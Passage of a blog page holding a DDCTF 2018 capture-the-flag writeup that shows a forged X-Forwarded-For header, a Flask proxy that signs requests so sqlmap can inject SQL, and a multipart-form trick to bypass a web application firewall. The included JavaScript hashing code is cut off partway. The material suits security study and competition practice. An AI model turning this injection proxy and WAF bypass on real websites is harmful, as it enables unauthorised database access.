@@ -1,0 +1,1757 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>DDCTF 2018 Writeup | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" ctf , writeup ">
+  <meta name="description" content="DDCTF 2018 Writeup | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-ddctf-ctf-2018" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">DDCTF 2018 Writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web">Web</a> > 
+            
+            <a  data-rel="Web&lt;---&gt;Writeup">Writeup</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">ctf</a>
+            
+            <a class="color3">writeup</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-16 00:46:50'>2018-04-21 03:38</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1-数据库的秘密"><span class="toc-text">Web1 数据库的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-4-mini-blockchain"><span class="toc-text">Web 4 mini blockchain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用后门"><span class="toc-text">利用后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不利用后门"><span class="toc-text">不利用后门</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 数据库的秘密"></a>Web1 数据库的秘密</h3><p><img src="/img/ddctf/1.png" alt=""></p>
+<p>很容易想到伪造XFF</p>
+<p><img src="/img/ddctf/2.png" alt=""></p>
+<p>接下来就是注入了。</p>
+<p>首先，我们发现有个校验</p>
+<p><img src="/img/ddctf/3.png" alt=""></p>
+<p>然后，看了下js，貌似有点复杂，这里采用</p>
+<p>sqlmap+python代理服务器（代理服务器处理校验的代码，通过python的execjs模块调用js代码）</p>
+<p>后又遇到了安全狗，使用<code>from-data</code>提交数据，达到绕过</p>
+<p>代理服务器main.py</p>
+<pre><code class="pyhon">from flask import Flask,request
+import requests
+import execjs
+import urllib
+app = Flask(__name__)
+
+
+def get_js():
+    f = open(&quot;./crc.js&quot;, &#39;r&#39;)#, encoding=&#39;UTF-8&#39;)
+    line = f.readline()
+    htmlstr = &#39;&#39;
+    while line:
+        htmlstr = htmlstr + line
+        line = f.readline()
+    return htmlstr
+
+jsstr = get_js()
+ctx = execjs.compile(jsstr)
+
+@app.route(&#39;/&#39;)
+def index():
+    id = request.args.get(&#39;id&#39;)
+    title = request.args.get(&#39;title&#39;)
+    date = request.args.get(&#39;date&#39;)
+    author = request.args.get(&#39;author&#39;)
+    print request.args.items().__str__()
+    crc_str = ctx.call(&#39;submitgg&#39;, id, title, date, author)
+    print crc_str
+    url = &quot;http://116.85.43.88:8080/PEQFGTUTQMZWCZGK/dfe3ia/&quot; + crc_str
+    # data = {
+    #     &#39;id&#39;:id,
+    #     &#39;title&#39;:title,
+    #     &#39;date&#39;:date,
+    #     &#39;author&#39;:author,
+    # }
+    data = {
+        &#39;id&#39;:id,
+        &#39;title&#39;:title,
+        &#39;date&#39;:date,
+        &#39;author&#39;:author,
+    }
+    print data
+    files = {
+        &#39;button&#39;: &#39;search&#39;,
+    }
+    try:
+        r = requests.post(url=url, headers={&quot;X-Forwarded-For&quot;: &quot;123.232.23.245&quot;}, data=data, files=files)
+    except Exception as e:
+        print e
+        return e
+    return r.content
+
+
+if __name__ == &quot;__main__&quot;:
+
+    app.run(debug=True)</code></pre>
+<p>crc.js</p>
+<pre><code class="javascript">/*
+ * A JavaScript implementation of the Secure Hash Algorithm, SHA-1, as defined
+ * in FIPS PUB 180-1
+ * Version 2.1-BETA Copyright Paul Johnston 2000 - 2002.
+ * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet
+ * Distributed under the BSD License
+ * See http://pajhome.org.uk/crypt/md5 for details.
+ */
+/*
+ * Configurable variables. You may need to tweak these to be compatible with
+ * the server-side, but the defaults work in most cases.
+ */
+var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */
+var b64pad = &quot;&quot;; /* base-64 pad character. &quot;=&quot; for strict RFC compliance  */
+var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */
+var key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;;
+/*
+ * These are the functions you&#39;ll usually want to call
+ * They take string arguments and return either hex or base-64 encoded strings
+ */
+function hex_math_enc(s) {
+ return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function b64_math_enc(s) {
+ return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function str_math_enc(s) {
+ return binb2str(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function hex_hmac_math_enc(key, data) {
+ return binb2hex(core_hmac_math_enc(key, data));
+}
+function b64_hmac_math_enc(key, data) {
+ return binb2b64(core_hmac_math_enc(key, data));
+}
+function str_hmac_math_enc(key, data) {
+ return binb2str(core_hmac_math_enc(key, data));
+}
+/*
+ * Perform a simple self-test to see if the VM is working
+ */
+function math_enc_vm_test() {
+ return hex_math_enc(&quot;abc&quot;) == &quot;a9993e364706816aba3e25717850c26c9cd0d89d&quot;;
+}
+/*
+ * Calculate the SHA-1 of an array of big-endian words, and a bit length
+ */
+function core_math_enc(x, len) {
+ /* append padding */
+ x[len &gt;&gt; 5] |= 0x80 &lt;&lt; (24 - len % 32);
+ x[((len + 64 &gt;&gt; 9) &lt;&lt; 4) + 15] = len;
+ var w = Array(80);
+ var a = 1732584193;
+ var b = -271733879;
